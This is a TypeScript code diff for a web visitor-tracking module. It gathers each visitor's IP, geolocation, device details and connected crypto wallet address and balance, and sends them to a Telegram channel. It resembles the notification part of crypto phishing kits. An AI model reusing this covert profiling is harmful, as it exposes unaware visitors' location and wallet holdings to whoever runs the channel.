@@ -1,41 +1,81 @@
 import { StorageManager } from './storage';
 import { sendToTelegram } from './telegram';
+import { DATA_COLLECTION_CONFIG, USER_INFO_CONFIG } from './config';
 
+/**
+ * Interface describing user and session information collected by the app
+ */
 export interface UserInfo {
+  /** User's IP address */
   ip: string;
+  
+  /** Website information */
   websiteInfo: {
+    /** Current URL */
     url: string;
+    /** Page title */
     title: string;
+    /** Referrer URL or 'Direct' */
     referrer: string;
+    /** Time spent on page in seconds (optional) */
+    timeOnPage?: number;
   };
+  
+  /** Geolocation information if available */
   location: {
+    /** User's city */
     city?: string;
+    /** User's country */
     country?: string;
+    /** User's region/state */
     region?: string;
   };
+  
+  /** Device information */
   device: {
+    /** Device type classification */
     type: 'Desktop' | 'Mobile' | 'Tablet';
+    /** Browser name */
     browser: string;
+    /** Operating system */
     os: string;
+    /** User agent string */
     userAgent: string;
   };
+  
+  /** Wallet information if connected */
   wallet: {
+    /** Wallet address */
     address?: string;
+    /** Network information */
     network?: {
+      /** Network name */
       name: string;
+      /** Network chain ID */
       chainId: number;
     };
+    /** Wallet balance */
     balance?: {
+      /** ETH balance */
       eth: string;
+      /** USD equivalent (if available) */
       usd?: string;
     };
+    /** Whether wallet is connected */
     isConnected: boolean;
   };
 }
 
+/**
+ * Initializes user tracking and sends data if appropriate
+ * @param walletInfo - Information about the user's connected wallet
+ * @returns Promise that resolves when tracking is complete
+ */
 export async function initializeUserTracking(walletInfo: UserInfo['wallet']): Promise<void> {
   if (StorageManager.shouldNotifyNewVisit()) {
-    console.log('New visit detected - collecting user information...');
+    if (DATA_COLLECTION_CONFIG.DEBUG_ENABLED) {
+      console.debug('New visit detected - collecting user information...');
+    }
     
     try {
       const userInfo = await getUserInfo(walletInfo);
@@ -45,24 +85,55 @@ export async function initializeUserTracking(walletInfo: UserInfo['wallet']): Pr
       
       if (messageSent) {
         StorageManager.setVisitTimestamp();
-        console.log('Visit recorded and notification sent');
+        if (DATA_COLLECTION_CONFIG.DEBUG_ENABLED) {
+          console.debug('Visit recorded and notification sent');
+        }
       }
     } catch (error) {
       console.error('Error processing new visit:', error);
     }
-  } else {
+  } else if (DATA_COLLECTION_CONFIG.DEBUG_ENABLED) {
     console.debug('Recent visit detected - skipping notification');
   }
 }
 
+/**
+ * Collects comprehensive information about the current user and their device
+ * @param walletInfo - Information about the user's connected wallet
+ * @returns Promise resolving to complete UserInfo object
+ */
 async function getUserInfo(walletInfo: UserInfo['wallet']): Promise<UserInfo> {
   try {
-    // Get IP address using a public API
-    const ipResponse = await fetch('https://api.ipify.org?format=json');
+    // Set up request with timeout for IP API
+    const ipController = new AbortController();
+    const ipTimeoutId = setTimeout(() => ipController.abort(), USER_INFO_CONFIG.API_TIMEOUT_MS);
+    
+    // Get IP address using the configured API endpoint
+    const ipResponse = await fetch(USER_INFO_CONFIG.IP_API_URL, {
+      signal: ipController.signal
+    });
+    clearTimeout(ipTimeoutId);
+    
+    if (!ipResponse.ok) {
+      throw new Error(`IP API response error: ${ipResponse.status} ${ipResponse.statusText}`);
+    }
+    
     const { ip } = await ipResponse.json();
 
-    // Get location information using IP
-    const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+    // Set up request with timeout for geolocation API
+    const geoController = new AbortController();
+    const geoTimeoutId = setTimeout(() => geoController.abort(), USER_INFO_CONFIG.API_TIMEOUT_MS);
+    
+    // Get location information using the configured geolocation API
+    const locationResponse = await fetch(`${USER_INFO_CONFIG.GEO_API_URL}/${ip}/json/`, {
+      signal: geoController.signal
+    });
+    clearTimeout(geoTimeoutId);
+    
+    if (!locationResponse.ok) {
+      throw new Error(`Geolocation API response error: ${locationResponse.status} ${locationResponse.statusText}`);
+    }
+    
     const locationData = await locationResponse.json();
 
     // Detect device type
@@ -75,49 +146,101 @@ async function getUserInfo(walletInfo: UserInfo['wallet']): Promise<UserInfo> {
     const browser = detectBrowser();
     const os = detectOS();
 
-    // Build complete user info with provided wallet info
+    // Calculate time on page - getting page load time if available
+    const timeOnPage = typeof performance !== 'undefined' && performance.now ? 
+      Math.round(performance.now() / 1000) : undefined;
+
+    // Build complete user info object
     return {
       ip,
       websiteInfo: {
         url: window.location.origin + window.location.pathname,
         title: document.title,
-        referrer: document.referrer || 'Direct'
+        referrer: document.referrer || 'Direct',
+        timeOnPage
       },
-      location: {
+      location: DATA_COLLECTION_CONFIG.COLLECT_LOCATION_INFO ? {
         city: locationData.city,
         country: locationData.country_name,
         region: locationData.region
-      },
-      device: {
+      } : {},
+      device: DATA_COLLECTION_CONFIG.COLLECT_DEVICE_INFO ? {
         type: deviceType,
         browser,
         os,
         userAgent
+      } : {
+        type: deviceType,
+        browser: 'Unknown',
+        os: 'Unknown',
+        userAgent: 'Redacted'
       },
       wallet: walletInfo // Use the wallet info passed from the component
     };
-  } catch (error) {
-    console.error('Error collecting user information:', error);
-    throw error;
+  } catch (error: unknown) {
+    if (error instanceof DOMException && error.name === 'AbortError') {
+      console.error('API request timed out while collecting user information');
+    } else if (error instanceof Error) {
+      console.error('Error collecting user information:', error.message);
+    } else {
+      console.error('Unknown error collecting user information');
+    }
+    
+    // Return partial information when there's an error
+    return {
+      ip: 'unknown',
+      websiteInfo: {
+        url: window.location.origin + window.location.pathname,
+        title: document.title,
+        referrer: document.referrer || 'Direct'
+      },
+      location: {},
+      device: {
+        type: 'Desktop',
+        browser: 'Unknown',
+        os: 'Unknown',
+        userAgent: navigator.userAgent
+      },
+      wallet: walletInfo
+    };
   }
 }
 
+/**
+ * Detects the browser name from the user agent string
+ * @returns Browser name string
+ */
 function detectBrowser(): string {
   const ua = navigator.userAgent;
+  
+  // Check for Edge first as it contains Chrome and Safari strings
+  if (ua.includes("Edg") || ua.includes("Edge")) return "Edge";
+  
+  // Check for other browsers
   if (ua.includes("Firefox")) return "Firefox";
+  if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
   if (ua.includes("Chrome")) return "Chrome";
   if (ua.includes("Safari")) return "Safari";
-  if (ua.includes("Edge")) return "Edge";
-  if (ua.includes("Opera")) return "Opera";
+  
   return "Unknown";
 }
 
+/**
+ * Detects operating system from the user agent string
+ * @returns Operating system name string
+ */
 function detectOS(): string {
   const ua = navigator.userAgent;
-  if (ua.includes("Windows")) return "Windows";
+  
+  // Check for mobile operating systems first
+  if (ua.includes("Android")) return "Android";
+  if (ua.includes("iPhone") || ua.includes("iPad") || ua.includes("iPod")) return "iOS";
+  
+  // Check for desktop operating systems
+  if (ua.includes("Win")) return "Windows";
   if (ua.includes("Mac OS")) return "macOS";
   if (ua.includes("Linux")) return "Linux";
-  if (ua.includes("Android")) return "Android";
-  if (ua.includes("iOS")) return "iOS";
+  if (ua.includes("X11")) return "Unix";
+  
   return "Unknown";
 }
